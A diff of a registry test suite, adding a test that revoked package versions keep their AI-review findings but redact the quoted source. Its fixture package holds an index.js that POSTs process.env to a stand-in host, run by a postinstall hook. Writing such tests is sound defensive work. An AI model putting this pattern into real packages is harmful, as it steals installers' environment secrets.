@@ -7,13 +7,14 @@ import { createHash, randomBytes } from "node:crypto";
 import { mkdtempSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
+import { z } from "zod";
 import { LeaseResponse } from "../../packages/ai-review/src/index.ts";
 import { DailyBudget } from "../../apps/reviewer/src/budget.ts";
 import { silentLogger } from "../../apps/reviewer/src/log.ts";
 import { modelClient } from "../../apps/reviewer/src/model.ts";
 import { registryClient } from "../../apps/reviewer/src/registry.ts";
 import { runOnce, type WorkerDeps } from "../../apps/reviewer/src/worker.ts";
-import { deviceLogin, dig, enableTotp, getJson, signInWithGitHub, startFakeGitHub, startRegistry, totp, type Browser, type FakeGitHub, type Registry } from "./harness";
+import { addUser, deviceLogin, dig, enableTotp, getJson, signInWithGitHub, startFakeGitHub, startRegistry, totp, type Browser, type FakeGitHub, type Registry } from "./harness";
 
 // ---------- a tar writer ----------
 type TarFile = { path: string; data: string };
@@ -552,5 +553,98 @@ describe("AI review", () => {
 
     expect((await getJson(`${reg.url}review-loss-lib`)).status).toBe(200);
     expect(await until(async () => dig((await review("review-loss-lib", "1.0.0")).body, "status") === "queued")).toBe(true);
+  });
+});
+
+// ---------- a revoked version's answers ----------
+describe("a revoked version", () => {
+  const PASSWORD = "correct-horse-battery";
+  const DAY = 24 * 60 * 60 * 1000;
+  const SOURCE = "collector.example.invalid";
+  const files = { "index.js": `const https = require('https');\nhttps.request({ host: '${SOURCE}', method: 'POST' }).end(JSON.stringify(process.env));\n` };
+  const manifest = (name: string) => ({ name, version: "1.0.0", license: "MIT", main: "index.js", readme: `# demo\n\nReports to ${SOURCE}.`, scripts: { postinstall: "node index.js" } }) satisfies Manifest;
+  const score = (name: string) => getJson(`${reg.url}-/apm/v1/score/${name}/1.0.0`);
+  const pkg = (name: string) => getJson(`${reg.url}-/apm/v1/packages/${name}`);
+  const Evidence = z.object({ evidence: z.array(z.string()) });
+  const ScoreEvidence = z.object({ signals: z.array(Evidence), dismissed: z.array(Evidence).default([]) });
+  const Queue = z.object({ pending: z.array(z.object({ name: z.string(), digest: z.string() })) });
+
+  /** Every evidence line of a version's score, signals and dismissed items alike. */
+  const evidenceOf = async (name: string): Promise<string[]> => {
+    const s = ScoreEvidence.parse((await score(name)).body);
+
+    return [...s.signals, ...s.dismissed].flatMap((e) => e.evidence);
+  };
+
+  test("its review, score and package answers keep what was found, not the source it quoted, revoked or pending", async () => {
+    const carol = await addUser(reg, "carol-revokes", PASSWORD);
+
+    // four days old when it is revoked, so the revoke is pending; the other is new, so it is final at once
+    const cases = [
+      { name: "ai-review-pending-demo", status: "revoke-pending" },
+      { name: "ai-review-revoked-demo", status: "revoked" },
+    ] as const;
+
+    await publish(reg, carol, manifest(cases[0].name), files);
+    clock += 4 * DAY;
+    await publish(reg, carol, manifest(cases[1].name), files);
+
+    for (let n = await runOnce(reviewer(), 4); n > 0; n = await runOnce(reviewer(), 4)) await Bun.sleep(0);
+    const queue = Queue.parse((await adminBrowser.json("-/apm/v1/review-admin/queue")).body);
+
+    for (const { name } of cases) {
+      const decision = { name, version: "1.0.0", digest: queue.pending.find((p) => p.name === name)?.digest, decision: "confirm", note: "Checked by hand.", code: totp(adminSecret) };
+
+      expect((await adminBrowser.json("-/apm/v1/review-admin/decide", { method: "POST", body: decision })).status).toBe(200);
+      // before the revoke, the confirmed finding, the score and the package page quote the package
+      const before = await review(name, "1.0.0");
+
+      expect(JSON.stringify(before.body)).toContain(SOURCE);
+      expect(dig(before.body, "redacted")).toBe(false);
+      expect((await evidenceOf(name)).join("\n")).toContain(SOURCE);
+      expect(JSON.stringify((await pkg(name)).body)).toContain(SOURCE);
+    }
+
+    for (const { name, status } of cases) {
+      const r = await getJson(`${reg.url}-/apm/v1/revoke`, {
+        method: "POST",
+        headers: { "content-type": "application/json", authorization: `Bearer ${carol}` },
+        body: JSON.stringify({ name, version: "1.0.0", reason: "posts the environment", password: PASSWORD }),
+      });
+
+      expect(dig(r.body, "status")).toBe(status);
+      // the file itself is refused
+      expect((await getJson(`${reg.url}-/apm/v1/file/${name}/1.0.0?path=index.js`)).status).toBe(410);
+
+      // the public answer and the maintainer's
+      for (const viewer of [undefined, carol]) {
+        const after = await review(name, "1.0.0", viewer);
+
+        expect(after.status).toBe(200);
+        expect(JSON.stringify(after.body)).not.toContain(SOURCE);
+        expect(dig(after.body, "redacted")).toBe(true);
+        expect(dig(after.body, "review", "state")).toBe("confirmed");
+        // the finding still says where and what
+        expect(dig(after.body, "review", "findings", 0, "file")).toBe("index.js");
+        expect(dig(after.body, "review", "findings", 0, "line")).toBe(2);
+        expect(dig(after.body, "review", "findings", 0, "issue")).toBe("Posts process.env to a remote host on import.");
+        expect(dig(after.body, "review", "findings", 0, "excerpt")).toBe("");
+      }
+
+      expect(dig((await review(name, "1.0.0", carol)).body, "private", "findings", 0, "line")).toBe(2);
+      const s = await score(name);
+
+      expect(s.status).toBe(200);
+      expect(dig(s.body, "redacted")).toBe(true);
+      expect(JSON.stringify(s.body)).not.toContain(SOURCE);
+      // evidence keeps its file and line, or the script it names
+      const evidence = await evidenceOf(name);
+
+      expect(evidence).toContain("package.json scripts.postinstall");
+      expect(evidence.some((e) => /^index\.js:\d+$/.test(e))).toBe(true);
+      // the package answer (its readme came from this version) and the packument
+      expect(JSON.stringify((await pkg(name)).body)).not.toContain(SOURCE);
+      expect(JSON.stringify((await getJson(`${reg.url}${name}`)).body)).not.toContain(SOURCE);
+    }
   });
 });
